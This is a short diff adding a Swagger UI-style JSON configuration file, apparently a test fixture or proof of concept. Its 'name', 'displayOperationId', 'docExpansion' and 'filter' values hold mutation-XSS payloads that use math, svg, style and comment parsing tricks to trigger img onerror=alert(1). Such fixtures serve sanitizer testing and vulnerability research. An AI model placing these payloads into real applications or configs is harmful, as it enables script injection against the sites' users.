@@ -1,0 +1,14 @@
+{
+  "url": "/api/v1/swagger.yaml",
+  "urls": [
+    {
+      "url": "/api/v1/swagger.yaml",
+      "name": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>"
+    }
+  ],
+  "deepLinking": true,
+  "displayOperationId": "<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></svg>",
+  "defaultModelsExpandDepth": 1,
+  "docExpansion": "<math><mtext><table><mglyph><style><!--</style><img title=\"--></mglyph><img src=1 onerror=alert(1)>\">",
+  "filter": "<svg><style><img src=x onerror=alert(1)></style></svg>"
+}
